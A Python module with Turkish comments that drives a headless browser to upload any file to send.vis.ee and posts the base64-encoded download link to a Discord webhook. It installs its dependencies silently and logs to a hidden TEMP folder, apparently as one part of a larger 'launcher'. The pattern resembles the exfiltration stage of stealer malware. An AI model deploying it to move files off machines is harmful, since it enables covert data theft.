from playwright.sync_api import sync_playwright
import json
import time
import subprocess
import sys
import os
from datetime import datetime
import requests
import base64

def main(file_path, webhook=None):
    """
    send.vis.ee sitesine dosya yükler ve indirme linkini döndürür/webhook'a gönderir
    
    Args:
        file_path (str): Yüklenecek dosyanın absolute path'i
        webhook (str, optional): İndirme linkinin gönderileceği Discord webhook URL'i
    
    Returns:
        str: İndirme linki veya None (hata durumunda)
    """
    
    # ===== YARDIMCI FONKSİYONLAR =====
    def ensure_lunix_dir():
        """Lunix dizinini oluştur"""
        temp_base = os.environ.get('TEMP', os.environ.get('TMP', os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'Temp')))
        lunix_dir = os.path.join(temp_base, 'lunix', 'sendvisee')
        os.makedirs(lunix_dir, exist_ok=True)
        return lunix_dir
    
    def log(message, print_to_console=False):
        """
        Log mesajını TEMP dizinindeki dosyaya yaz
        
        Args:
            message (str): Log mesajı
            print_to_console (bool): True ise ekrana da yazdır
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(log_message)
            if print_to_console:
                print(log_message.strip())
        except Exception as e:
            print(f"Log hatası: {e}")
    
    def clear_log():
        """Log dosyasını temizle"""
        try:
            if os.path.exists(log_file):
                os.remove(log_file)
        except Exception as e:
            pass
    
    def check_and_install_playwright():
        """Playwright ve Chromium'un yüklü olup olmadığını kontrol eder"""
        log("=" * 60)
        log("Playwright kurulum kontrolü başlatılıyor...")
        
        try:
            import playwright
            log("✓ Playwright kütüphanesi zaten yüklü")
        except ImportError:
            log("⚠️  Playwright kütüphanesi bulunamadı, yükleme başlatılıyor...", print_to_console=True)
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", "playwright"], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL
                )
                log("✓ Playwright başarıyla yüklendi")
            except subprocess.CalledProcessError as e:
                log(f"❌ Playwright yükleme hatası: {e}", print_to_console=True)
                return False
            except Exception as e:
                log(f"❌ Beklenmeyen Playwright kurulum hatası: {e}", print_to_console=True)
                return False
        
        try:
            log("Chromium varlığı kontrol ediliyor...")
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser_type = p.chromium
                executable_path = browser_type.executable_path
                
                if not os.path.exists(executable_path):
                    raise FileNotFoundError(f"Chromium bulunamadı: {executable_path}")
                
            log(f"✓ Chromium mevcut: {executable_path}")
            return True
            
        except FileNotFoundError as e:
            log(f"⚠️  Chromium bulunamadı: {e}", print_to_console=True)
            log("Chromium indiriliyor... (Bu işlem birkaç dakika sürebilir)", print_to_console=True)
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "playwright", "install", "chromium"],
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL
                )
                log("✓ Chromium başarıyla indirildi")
                return True
            except subprocess.CalledProcessError as e:
                log(f"❌ Chromium indirme hatası: {e}", print_to_console=True)
                return False
            except Exception as e:
                log(f"❌ Beklenmeyen Chromium kurulum hatası: {e}", print_to_console=True)
                return False
        except Exception as e:
            log(f"❌ Chromium kontrol hatası: {e}", print_to_console=True)
            return False
    
    # ===== LOG DOSYASI HAZIRLIĞI =====
    log_file = os.path.join(ensure_lunix_dir(), "sendvisee.log.txt")
    clear_log()
    
    log("\n" + "=" * 60)
    log("send.vis.ee File Uploader")
    log(f"Başlangıç zamanı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log("=" * 60)
    
    # ===== DOSYA KONTROLÜ =====
    if not os.path.exists(file_path):
        log(f"❌ Dosya bulunamadı: {file_path}", print_to_console=True)
        return None
    
    if not os.path.isfile(file_path):
        log(f"❌ Belirtilen path bir dosya değil: {file_path}", print_to_console=True)
        return None
    
    file_size = os.path.getsize(file_path)
    log(f"✓ Dosya bulundu: {file_path}")
    log(f"  - Dosya boyutu: {file_size} bytes ({file_size/1024:.2f} KB)")
    
    # ===== PLAYWRIGHT KURULUM KONTROLÜ =====
    if not check_and_install_playwright():
        log("❌ Playwright kurulumu başarısız, işlem sonlandırılıyor", print_to_console=True)
        return None
    
    # ===== DOSYA YÜKLEME İŞLEMİ =====
    log("=" * 60)
    log("Dosya yükleme işlemi başlatılıyor...")
    
    with sync_playwright() as p:
        browser = None
        try:
            log("Chromium tarayıcısı başlatılıyor (headless mode)...")
            browser = p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            log("✓ Tarayıcı başarıyla başlatıldı")
            
            log("Yeni browser context oluşturuluyor...")
            context = browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            log("✓ Context oluşturuldu")
            
            log("Yeni sayfa açılıyor...")
            page = context.new_page()
            log("✓ Sayfa oluşturuldu")
            
            log("URL'ye gidiliyor: https://send.vis.ee/")
            page.goto("https://send.vis.ee/", wait_until="networkidle")
            log("✓ Sayfa başarıyla yüklendi")
            
            log("Sayfa render edilmesi için 2 saniye bekleniyor...")
            time.sleep(2)
            
            # Dosya input elementini bul ve dosyayı yükle
            log("Dosya input elementi aranıyor (#file-upload)...")
            file_input = page.locator('#file-upload')
            file_input.wait_for(state="attached", timeout=10000)
            log("✓ Dosya input elementi bulundu")
            
            log(f"Dosya yükleniyor: {file_path}")
            file_input.set_input_files(file_path)
            log("✓ Dosya başarıyla seçildi")
            
            log("Dosya işlenmesi için 2 saniye bekleniyor...")
            time.sleep(2)
            
            # Yükle butonunu bul ve tıkla
            log("'Yükle' butonu aranıyor (#upload-btn)...")
            upload_button = page.locator('#upload-btn')
            upload_button.wait_for(state="visible", timeout=10000)
            log("✓ 'Yükle' butonu bulundu")
            
            log("'Yükle' butonuna tıklanıyor...")
            upload_button.click()
            log("✓ Butona başarıyla tıklandı")
            
            # İndirme linkinin yüklenmesini bekle
            log("İndirme linkinin oluşması bekleniyor...")
            share_url_input = page.locator('#share-url')
            share_url_input.wait_for(state="visible", timeout=30000)
            log("✓ İndirme linki elementi bulundu")
            
            # Input değerini al
            log("İndirme linki değeri alınıyor...")
            download_url = share_url_input.get_attribute('value')
            log(f"✓ İndirme linki alındı: {download_url}")
            
            # Tarayıcıyı kapat
            log("Tarayıcı kapatılıyor...")
            browser.close()
            log("✓ Tarayıcı başarıyla kapatıldı")
            
            # ===== DISCORD WEBHOOK GÖNDERİMİ =====
            if webhook:
                log("=" * 60)
                log(f"Discord Webhook'a gönderiliyor: {webhook}")
                try:
                    # URL'yi base64'e çevir
                    encoded_url = base64.b64encode(download_url.encode('utf-8')).decode('utf-8')
                    
                    payload = {
                        "content": encoded_url
                    }
                    
                    response = requests.post(
                        webhook, 
                        json=payload,
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                    
                    if response.status_code == 204:
                        log(f"✓ Discord webhook'a başarıyla gönderildi (Status: {response.status_code})")
                    else:
                        log(f"⚠️  Discord webhook yanıt kodu: {response.status_code}", print_to_console=True)
                        log(f"   Yanıt: {response.text[:200]}")
                        
                except requests.RequestException as e:
                    log(f"❌ Discord webhook gönderme hatası: {e}", print_to_console=True)
                except Exception as e:
                    log(f"❌ Beklenmeyen webhook hatası: {e}", print_to_console=True)
            
            log("=" * 60)
            log("✓✓✓ TÜM İŞLEMLER BAŞARIYLA TAMAMLANDI ✓✓✓")
            log(f"Bitiş zamanı: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            log("=" * 60 + "\n")
            
            return download_url
            
        except TimeoutError as e:
            log(f"❌ Timeout hatası: {e}", print_to_console=True)
            log(f"   Detay: Element beklenen sürede yüklenmedi", print_to_console=True)
            if browser:
                try:
                    browser.close()
                    log("  - Tarayıcı kapatıldı")
                except:
                    pass
            return None
            
        except Exception as e:
            log(f"❌ Beklenmeyen hata: {type(e).__name__}: {e}", print_to_console=True)
            import traceback
            log(f"   Stack trace:\n{traceback.format_exc()}", print_to_console=True)
            if browser:
                try:
                    browser.close()
                    log("  - Tarayıcı kapatıldı")
                except:
                    pass
            return None


# Test için (launcher'dan import edildiğinde çalışmaz)
if __name__ == "__main__":
    # Test kullanımı
    test_file = r"C:\path\to\your\file.txt"
    test_webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"
    
    result = main(test_file, test_webhook)
    
    if result:
        print(f"\n✓ Başarılı!")
        print(f"İndirme linki: {result}")
    else:
        print("\n❌ İşlem başarısız!")